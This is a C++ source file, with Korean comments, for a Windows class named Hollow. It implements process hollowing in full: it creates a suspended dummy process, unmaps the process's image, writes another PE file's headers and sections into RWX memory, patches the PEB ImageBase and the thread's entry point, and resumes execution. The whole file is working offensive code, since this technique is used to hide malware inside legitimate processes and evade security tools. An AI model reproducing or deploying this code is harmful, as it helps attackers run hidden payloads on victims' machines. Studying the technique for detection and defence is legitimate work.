#define _CRT_SECURE_NO_WARNINGS
#include "Hollow.h"
#include <iostream>

#pragma comment(lib, "ntdll.lib")

using namespace std;

void PrintError(const char* msg) { // PrintError 함수 정의
    DWORD errorMessageID = ::GetLastError();
    if (errorMessageID == 0)
        return; // No error message has been recorded

    LPSTR messageBuffer = nullptr;
    size_t size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    cout << msg << ": " << messageBuffer << endl;
    LocalFree(messageBuffer);
}

Hollow::Hollow() {
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
}
Hollow::~Hollow() {
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);
}

bool Hollow::CreateDummyProcess(const wchar_t* pCommandLine) {
    wchar_t szCommandLine[MAX_PATH] = { 0, };

    wcscpy(szCommandLine, pCommandLine);
    if (!CreateProcessW(NULL, szCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &this->si, &this->pi)) {
        PrintError("Failed to create process");
        return false;
    }

    cout << "Dummy process created successfully." << endl;
    return true;
}

bool Hollow::ProcessHollowing(const wchar_t* pProgramPath) {
    HANDLE hFile = INVALID_HANDLE_VALUE, hFileMapping = NULL;

    PIMAGE_DOS_HEADER pDos = nullptr;
    PIMAGE_NT_HEADERS64 pNt = nullptr;
    PIMAGE_SECTION_HEADER pSec = nullptr;

    CONTEXT ctx = { 0 };
    LPVOID lpTargetBase = nullptr, lpAllocMem = nullptr;

    ctx.ContextFlags = CONTEXT_FULL;

    if (this->pi.dwProcessId == 0 || this->pi.dwThreadId == 0) {
        PrintError("Invalid process or thread ID");
        return false;
    }

    hFile = CreateFileW(pProgramPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("Failed to open target program");
        return false;
    }
    cout << "Target program opened successfully." << endl;

    hFileMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hFileMapping == INVALID_HANDLE_VALUE) {
        PrintError("Failed to create file mapping");
        return false;
    }
    cout << "File mapping created successfully." << endl;

    pDos = (PIMAGE_DOS_HEADER)MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        PrintError("Invalid DOS signature");
        return false;
    }
    cout << "DOS header read successfully." << endl;

    pNt = (PIMAGE_NT_HEADERS64)((PBYTE)pDos + pDos->e_lfanew);
    // Dummy 프로세스 메인 스레드 컨텍스트 가져오기
    if (!GetThreadContext(this->pi.hThread, &ctx)) {
        PrintError("Failed to get thread context");
        return false;
    }
    cout << "Thread context obtained successfully." << endl;

    // PEB에서 ImageBase 읽기
    if (!ReadProcessMemory(this->pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), &lpTargetBase, sizeof(LPVOID), NULL)) {
        PrintError("Failed to read process memory for ImageBase");
        return false;
    }
    cout << "ImageBase read from PEB successfully." << endl;

    // Dummy 프로세스의 베이스 주소와 스위칭할 프로그램의 베이스 주소가 같을 시에 언매핑
    if (lpTargetBase == (LPVOID)pNt->OptionalHeader.ImageBase) {
        if (NtUnmapViewOfSection(this->pi.hProcess, lpTargetBase) != 0) {
            PrintError("Failed to unmap view of section");
            return false;
        }
    }
    cout << "Unmapped view of section successfully." << endl;

    // Dummy 프로세스에 ImageBase 주소 메모리 할당
    lpAllocMem = VirtualAllocEx(this->pi.hProcess, (LPVOID)pNt->OptionalHeader.ImageBase, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpAllocMem == NULL) {
        PrintError("Failed to allocate memory in target process");
        return false;
    }
    cout << "Memory allocated in target process successfully." << endl;

    // PE 헤더 쓰기
    if (!WriteProcessMemory(this->pi.hProcess, lpAllocMem, pDos, pNt->OptionalHeader.SizeOfHeaders, NULL)) {
        PrintError("Failed to write PE headers");
        return false;
    }
    cout << "PE headers written successfully." << endl;

    // 섹션 쓰기
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        pSec = (PIMAGE_SECTION_HEADER)((PBYTE)pDos + pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER)));
        if (!WriteProcessMemory(this->pi.hProcess, (LPVOID)((PBYTE)lpAllocMem + pSec->VirtualAddress), (LPVOID)((PBYTE)pDos + pSec->PointerToRawData), pSec->SizeOfRawData, NULL)) {
            PrintError("Failed to write section");
            return false;
        }
    }
    cout << "Sections written successfully." << endl;

    // EntryPoint 설정
    ctx.Rcx = (DWORD64)((PBYTE)lpAllocMem + pNt->OptionalHeader.AddressOfEntryPoint);
    // PEB ImageBase 재설정
    if (!WriteProcessMemory(this->pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &pNt->OptionalHeader.ImageBase, sizeof(PVOID), NULL)) {
        PrintError("Failed to write ImageBase to PEB");
        return false;
    }
    cout << "EntryPoint and ImageBase set successfully." << endl;

    // 스레드 컨텍스트 적용
    if (!SetThreadContext(this->pi.hThread, &ctx)) {
        PrintError("Failed to set thread context");
        return false;
    }
    cout << "Thread context set successfully." << endl;

    // Dummy 프로세스의 메인 스레드 재계
    if (NtResumeThread(this->pi.hThread, NULL) != 0) {
        PrintError("Failed to resume thread");
        return false;
    }
    cout << "Thread resumed successfully." << endl;

    UnmapViewOfFile(pDos);
    CloseHandle(hFile);
    CloseHandle(hFileMapping);
    return true;
}
